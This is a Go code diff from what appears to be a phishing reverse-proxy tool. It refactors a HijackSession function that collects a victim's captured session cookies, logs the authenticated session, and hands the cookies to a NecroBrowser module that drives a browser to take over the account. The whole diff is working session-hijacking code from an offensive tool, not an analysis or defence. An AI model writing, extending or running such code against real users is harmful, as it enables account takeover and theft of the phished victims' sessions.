@@ -417,13 +417,12 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 
 	// HIJACK!
 	if getSession {
-
-		var sessCookies []necrobrowser.SessionCookie
+		var sessCookies []http.Cookie
 		var cookies string
 
 		// get all the cookies from the CookieJar
 		victim.Cookies.Range(func(k, v interface{}) bool {
-			_, c := k.(string), v.(necrobrowser.SessionCookie)
+			_, c := k.(string), v.(http.Cookie)
 			j, err := json.Marshal(c)
 			if err != nil {
 				t.Warning(err.Error())
@@ -432,41 +431,26 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 			cookies += string(j) + " "
 			t.Debug("Adding cookie: %s \n %v", string(j), c)
 
-			sessCookies = append(sessCookies, necrobrowser.SessionCookie{
-				Name:     c.Name,
-				Value:    c.Value,
-				Domain:   c.Domain,
-				Expires:  "", // will be set by necrobrowser
-				Path:     c.Path,
-				HTTPOnly: c.HTTPOnly,
-				Secure:   c.Secure,
-			})
+			sessCookies = append(sessCookies, c)
 
 			return true
 		})
 
-		t.Info("Authenticated Session for %s: %s", t.ID, tui.Red(cookies))
+		t.Debug("Authenticated Session for %s: %s", t.ID, tui.Red(cookies))
 
 		// Send to NecroBrowser
 		if t.Session.Config.NecroBrowser.Enabled == true {
 			t.Info("NecroBrowser Enabled.")
-			instrumentationRequest := necrobrowser.InstrumentNecrobrowser{
-				Provider:       t.Session.Config.NecroBrowser.Profile,
-				DebuggingPort:  t.Session.Config.InstrumentationPort + 1,
-				SessionCookies: sessCookies,
-				// TODO hack to pass more info for necrobrowser
-				//Keywords:       t.Session.Config.NecroBrowser.Keywords,
-				Keywords: []string{fmt.Sprintf("%s_%s", victim.Username, victim.ID)},
-			}
+			t.Info("%+v", t.Session.Config.NecroBrowser.Profile)
 
 			m, err := t.Session.Module("necrobrowser")
 			if err != nil {
 				t.Error("%s", err)
-			}
-
-			nb, ok := m.(*necrobrowser.Necrobrowser)
-			if ok {
-				go nb.InstrumentNecroBrowser(&instrumentationRequest)
+			} else {
+				nb, ok := m.(*necrobrowser.Necrobrowser)
+				if ok {
+					go nb.InstrumentNecroBrowser(sessCookies)
+				}
 			}
 		} else {
 			t.Info("NecroBrowser Disabled.")
